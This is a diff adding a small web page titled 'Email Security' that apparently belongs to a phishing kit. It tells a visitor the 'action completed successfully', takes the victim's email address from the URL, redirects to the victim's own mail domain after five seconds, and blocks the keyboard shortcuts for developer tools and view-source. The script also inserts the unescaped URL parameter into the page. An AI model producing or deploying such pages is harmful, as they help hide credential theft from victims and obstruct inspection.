@@ -1,0 +1,155 @@
+
+
+<!doctype html>
+<html lang="en">
+
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+
+
+
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+
+   
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <title>Email Security</title>
+    <link href="css/hover.html" rel="stylesheet" media="all"> 
+    <style type="text/css">
+      textarea:hover, 
+      input:hover, 
+      textarea:active, 
+      input:active, 
+      textarea:focus, 
+      input:focus,
+      button:focus,
+      button:active,
+      button:hover,
+      label:focus,
+      .btn:active,
+      .btn.active
+      {
+        outline:0px !important;
+        -webkit-appearance:none;
+        box-shadow: none !important;
+        border-color: none !important;
+      }
+
+
+      .input-icons i { 
+        position: absolute; 
+      } 
+
+      .input-icons { 
+        width: 100%; 
+      } 
+
+      .icon { 
+        padding: 10px; 
+        min-width: 40px;
+        color: #8FA7AD; 
+      } 
+
+      .input-field { 
+        width: 100%; 
+        padding: 5px;
+        padding-left: 40px ;
+        text-align: left;
+        border: 1px solid #8FA7AD; 
+      } 
+
+
+
+    </style>
+  </head>
+  <!-- oncontextmenu="return false" -->
+  <body>
+    <div class="container-fluid p-0">
+
+      <div class="container-fluid">
+        <center><div class="row" style="margin: 100px 400px 50px 450px;text-align:left;font-size:26px;color:green;">
+          <div class="col-md-5 mx-auto">
+            <div class="p-2 bg-white m-3">
+              <div class="col-lg-12 mx-auto">
+              <div class="col-lg-12 text-center">
+                <img src="https://cdn.glitch.me/bf351d27-95d1-422c-8174-62a196a2a351/mail-123.png?v=1611056358882"><br>
+                
+              </div>
+              <div class="col-lg-12 text-center">
+                <span class="text-secondary">Action completed successfully!
+               
+
+                
+              </div>
+			  
+              <form id="contact" class="form-horizontal well">
+                
+              </div>
+            </form>
+              
+            </div>
+          </div>
+           
+        </div> </center>
+      </div>	
+    </div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script>
+
+
+    /* global $ */
+    $(document).ready(function(){
+	
+	
+     function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+          vars[key] = value;
+        });
+        return vars;
+      }
+      
+      var number = getUrlVars()["msg"];
+
+       $("#email_get1").html(number);
+       $("#email_get3").html(number);
+       var my_email =number;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var domain=final.charAt(0).toUpperCase() + final.slice(1);
+        $("#email_get2").html(my_slice);
+        $("#domain_get0").html(domain);
+        $("#domain_get1").html(domain);
+        $("#domain_get2").html(domain);
+
+       setTimeout(() => {  window.location.replace("https://www."+my_slice); }, 5000);
+   });
+
+    document.onkeydown=function(e){
+      if (e.ctrlKey && 
+        (e.keyCode === 73 || 
+         e.keyCode === 105 ||
+         e.keyCode === 74 || 
+         e.keyCode === 106 || 
+         e.keyCode === 85 || 
+         e.keyCode === 117)) {
+        alert('not allowed');
+      return false;
+    } else {
+      return true;
+    }
+  }
+</script>
+
+
+  </body>
+
+</html>
